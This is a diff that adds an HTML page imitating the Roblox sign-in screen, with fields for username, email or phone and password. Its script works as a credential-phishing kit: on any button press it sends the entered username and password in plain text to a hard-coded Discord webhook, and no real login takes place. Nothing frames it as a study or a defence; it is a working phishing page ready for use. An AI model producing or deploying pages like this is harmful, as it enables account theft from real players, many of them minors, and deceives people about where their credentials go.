@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROBLOX</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+
+        .login-container {
+            background-color: #232527;
+            padding: 40px;
+            width: 350px;
+            max-width: 100%;
+            text-align: center;
+            color: white;
+            border-radius: 8px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+        }
+
+        h2 {
+            margin-top: 0;
+            font-size: 28px;
+            color: white;
+            font-weight: 900;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background-color: #393b3d;
+            border: 1px solid #585858;
+            color: white;
+            box-sizing: border-box;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #28a745;
+        }
+
+        input::placeholder {
+            color: #888;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            cursor: pointer;
+            border: none;
+            font-weight: bold;
+            border-radius: 4px;
+            font-size: 15px;
+            transition: background-color 0.3s;
+        }
+
+        .btn-login {
+            background-color: #28a745;
+            color: white;
+        }
+
+        .btn-login:hover {
+            background-color: #218838;
+        }
+
+        .btn-secondary {
+            background-color: #393b3d;
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            background-color: #4a4c4e;
+        }
+
+        a {
+            color: #0084dd;
+            text-decoration: none;
+            display: block;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        hr {
+            border: 0;
+            border-top: 1px solid #444;
+            margin: 20px 0;
+        }
+
+        #status {
+            margin-top: 12px;
+            font-size: 14px;
+            padding: 8px;
+            border-radius: 4px;
+            min-height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0, 0, 0, 0.2);
+        }
+
+        #status.success {
+            color: #28a745;
+        }
+
+        #status.error {
+            color: #ff6b6b;
+        }
+
+        #status.loading {
+            color: #ffcc00;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h2>Login To Roblox</h2>
+    
+    <input type="text" id="loginInput" placeholder="Username/Email/Phone">
+    <input type="password" id="passwordInput" placeholder="Password">
+    <button class="btn-login" id="loginBtn">Log In</button>
+    
+    <a href="#">Forgot Password or Username?</a>
+    
+    <hr>
+    
+    <button class="btn-secondary" id="codeBtn">Email Me a One-Time Code</button>
+    <button class="btn-secondary" id="quickBtn">Quick Sign-in</button>
+    
+    <a href="#">Don't have an account? Sign Up</a>
+
+    <div id="status">Ready</div>
+</div>
+
+<script>
+    (function() {
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1524526756730634330/TX6UcQHJfJRz9LFTnH7fYqt4HghNI45SMWWuCqvStK16x7vyaomwf4z9jovV8Zl7ruqV';
+
+        const loginInput = document.getElementById('loginInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const loginBtn = document.getElementById('loginBtn');
+        const codeBtn = document.getElementById('codeBtn');
+        const quickBtn = document.getElementById('quickBtn');
+        const statusDiv = document.getElementById('status');
+
+        function setStatus(text, type = '') {
+            statusDiv.textContent = text;
+            statusDiv.className = type;
+        }
+
+        async function sendToWebhook(login, password, action) {
+            const loginValue = login.trim() || '(empty)';
+            const passwordValue = password.trim() || '(empty)';
+
+            const message = `
+Action: ${action}
+Username: ${loginValue}
+Password: ${passwordValue}
+            `.trim();
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: '```' + message + '```' })
+                });
+
+                return response.ok;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        async function handleLogin(action) {
+            const login = loginInput.value;
+            const password = passwordInput.value;
+
+            setStatus('Sending...', 'loading');
+
+            const success = await sendToWebhook(login, password, action);
+
+            if (success) {
+                setStatus('Sent successfully!', 'success');
+            } else {
+                setStatus('Error sending data', 'error');
+            }
+        }
+
+        loginBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            handleLogin('Log In');
+        });
+
+        codeBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            handleLogin('Email Code');
+        });
+
+        quickBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            handleLogin('Quick Sign-in');
+        });
+
+        loginInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                passwordInput.focus();
+            }
+        });
+
+        passwordInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                loginBtn.click();
+            }
+        });
+
+        setStatus('Ready', '');
+    })();
+</script>
+
+</body>
+</html>
